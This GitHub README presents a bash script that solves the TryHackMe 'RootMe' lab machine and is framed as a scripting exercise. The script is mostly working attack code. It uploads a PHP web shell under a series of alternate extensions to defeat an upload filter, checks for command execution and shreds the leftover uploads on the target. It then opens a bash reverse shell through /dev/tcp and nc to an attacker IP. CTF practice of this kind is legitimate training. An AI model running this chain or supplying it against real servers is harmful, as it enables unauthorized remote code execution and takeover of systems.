> The purpose of this script is to practice scripting in bash and understand the techniques involved in bypassing file upload restrictions. It serves as a learning exercise and should only be used on authorized systems for educational purposes.

# TryHackMe-RootMe
### Bash script to solve the TryHackMe machine: [RootMe](https://tryhackme.com/room/rrootme). I wrote this script to learn and practice bash scripting. I used it to bypass file upload restrictions and gain access to the server, allowing me to escalate privileges later on.

![ezgif com-crop](https://github.com/kvlx-alt/File-upload-bypass-TryHackMe-RootMe/assets/118694485/3a0bc6f0-8bcb-4b91-887e-ef982cd1efa5)


``` bash
#!/bin/bash

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Ctrl C
trap 'echo -e "\n\n${redColour}[!] Keyboard interruption detected. Terminating.${endColour}\n"; exit 1' INT

file_extension=(".php" ".php2" ".php3" ".php4" ".php5" ".php6" ".php7" ".phps" ".phps" ".pht" ".phtm" ".phtml" ".pgif" ".shtml" ".htaccess" ".phar" ".inc" ".hphp" ".ctp" ".module")
# let's create a file with some PHP code
php_code='<?php system($_GET["cmd"]); ?>'

for extension in "${file_extension[@]}"; do
  
  echo "$php_code" > "cmd${extension}"
  sleep 2
  response=$(curl -s -F "fileUpload=@cmd${extension}" -F "submit=" "http://10.10.45.41/panel/")
  
  if echo "$response" | grep -q "PHP não é permitido!"; then
    echo -e "${yellowColour}[*]Checking file extension cmd${extension}${endColour}"
    echo -e "${redColour}Sorry, you cannot upload this file${endColour}${yellowColour} >${endColour} ${purpleColour}cmd$extension.${endColour}"
  else
    echo -ne "\r${yellowColour}[*]Checking if the${endColour} ${redColour}whoami${endColour} ${yellowColour}commmand works with the following extension file cmd${extension}${endColour}"
    check_cmd=$(curl -s "http://10.10.45.41/uploads/cmd${extension}?cmd=whoami")
    if echo "$check_cmd" | grep -q "www-data"; then
      echo -e "${redColour} [Yes] ${endColour}${purpleColour}$check_cmd${endColour}"
      sleep 2
      valid_extention="cmd${extension}"
      echo -e "${yellowColour}[!]Delete invalid files on the server${endColour}"
      sleep 3
      echo -e "${yellowColour}[*]${endColour}${yellowColour}Success fully deleted.${endColour}"
      echo -e "${yellowColour}[!]Please open another terminal and start listening to the reverse shell with the following command${endColour} ${redColour}nc -nlvp 5001${endColour}"
      sleep 20
      curl -s 'http://10.10.45.41/uploads/cmd${extension}?cmd=find%20.%20-maxdepth%201%20-type%20f%20-name%20%22cmd*%22%20%21%20-name%20"'$valid_extention'"%20-exec%20shred%20-u%20%7B%7D%20%5C%3B'
      echo -e "${yellowColour}[*]triyng reverse shell${endColour}"
      shell=$(echo -e "GET /uploads/cmd${extension}?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.2.39.16%2F5001%200%3E%261%27 HTTP/1.0\r\n\r\n" | nc 10.10.45.41 80)
      break
    fi
  fi
  rm "cmd${extension}"
done
```
### I'm learning, so I appreciate any help and recommendations you can give me to improve my scripting in bash. 
> Hey, follow me on [LinkedIn!](https://www.linkedin.com/in/kevinvanegaszubiria)
